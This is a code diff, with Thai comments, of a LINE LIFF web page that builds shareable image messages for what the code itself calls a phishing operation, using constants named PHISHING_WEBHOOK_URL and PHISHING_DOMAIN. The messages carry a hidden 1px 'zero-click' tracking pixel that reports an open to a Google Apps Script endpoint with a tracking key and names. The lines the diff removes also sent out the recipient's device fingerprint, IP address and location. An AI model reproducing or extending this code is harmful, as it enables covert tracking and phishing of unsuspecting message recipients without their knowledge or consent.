@@ -32,23 +32,23 @@
             padding: 20px;
             text-align: center;
             position: relative;
-            display: flex; 
+            display: flex; /* Added */
             align-items: center; /* Added */
             justify-content: center; /* Added */
             gap: 10px; /* Added space between icon and text */
         }
-        .header .header-icon { 
+        .header .header-icon { /* Added */
             width: 28px;
             height: 28px;
             fill: white; /* Color the SVG icon white */
         }
-        .header .header-text { 
+        .header .header-text { /* Added */
              text-align: left;
         }
         .header h1 {
             margin: 0;
             font-size: 20px;
-            font-weight: 700;
+            font-weight: 700; /* Slightly bolder */
         }
         .header .subtitle {
             font-size: 13px; /* Slightly smaller */
@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw9cR5mBxAeS73Zp7zIoQKEfysj9W2zRsijifsuErkacXx-rpfaO3pmbNeB4Yzz7pekwQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjAnQD04sC3aq1nynOVzfxSawrK87LtJWts5VNwYjCziPhlrMvGemyiwjJMcPKzPTSZQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,44 +820,11 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
-                const deviceInfo = getEnhancedDeviceInfo();
-                const ipInfo = await getIPInfo();
-                
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
+                // สร้าง URL สำหรับ Zero Click tracking (สำหรับรูปพิกเซลเล็กๆ ที่มองไม่เห็น)
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
+                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
                 
-                // ข้อมูลเกี่ยวกับอุปกรณ์เพิ่มเติม
-                zeroClickTrackUrl += `&ua=${encodeURIComponent(navigator.userAgent)}`;
-                zeroClickTrackUrl += `&platform=${encodeURIComponent(deviceInfo.platform)}`;
-                zeroClickTrackUrl += `&browser=${encodeURIComponent(deviceInfo.browser)}`;
-                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(deviceInfo.deviceType)}`;
-                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(deviceInfo.deviceModel)}`;
-                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(deviceInfo.screenSize)}`;
-                zeroClickTrackUrl += `&language=${encodeURIComponent(navigator.language || '')}`;
-
-                // ข้อมูล IP (ถ้าสามารถดึงได้)
-                if (ipInfo && ipInfo.ip) {
-                    zeroClickTrackUrl += `&ip=${encodeURIComponent(ipInfo.ip)}`;
-                    zeroClickTrackUrl += `&country=${encodeURIComponent(ipInfo.country || '')}`;
-                    zeroClickTrackUrl += `&city=${encodeURIComponent(ipInfo.city || '')}`;
-                    zeroClickTrackUrl += `&region=${encodeURIComponent(ipInfo.region || '')}`;
-                    zeroClickTrackUrl += `&org=${encodeURIComponent(ipInfo.org || '')}`;
-                }
-                
-                // เพิ่มข้อมูลการเชื่อมต่อ
-                if (deviceInfo.connection) {
-                    zeroClickTrackUrl += `&netType=${encodeURIComponent(deviceInfo.connection.type || '')}`;
-                    zeroClickTrackUrl += `&netSpeed=${encodeURIComponent(deviceInfo.connection.downlink || '')}`;
-                }
-
-                // เพิ่ม random parameter เพื่อป้องกันการแคช
-                zeroClickTrackUrl += `&r=${randomSuffix}`;
-                
-                console.log("Zero Click Track URL:", zeroClickTrackUrl);
-
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
+                // สร้าง Flex Message ที่มีรูปภาพหลักที่คลิกได้ + รูปพิกเซลเล็กๆ สำหรับ Zero Click tracking
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -874,22 +841,22 @@
                                 uri: clickTrackUrl
                             }
                         },
-                        // เพิ่ม Zero Click tracking ที่ทำงานเมื่อมีการเปิดดูข้อความ
                         footer: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
                                 {
                                     type: 'image',
-                                    url: `${zeroClickTrackUrl}&t=${Date.now()}`,
-                                    size: '1px', // ทำให้เล็กมากจนแทบมองไม่เห็น
+                                    url: `${zeroClickTrackUrl}`, // รูปพิกเซลเล็กๆ ที่มองไม่เห็น
+                                    size: '1px', // ขนาดเล็กมากๆ จนมองไม่เห็น
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover'
                                 }
                             ],
                             spacing: '0px',
                             margin: '0px',
-                            height: '1px'
+                            height: '1px',
+                            paddingAll: '0px'
                         }
                     }
                 };
@@ -904,7 +871,7 @@
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // บันทึก Tracking Key Mapping ก่อน
+                        // บันทึก Tracking Key Mapping หลังแชร์สำเร็จ
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
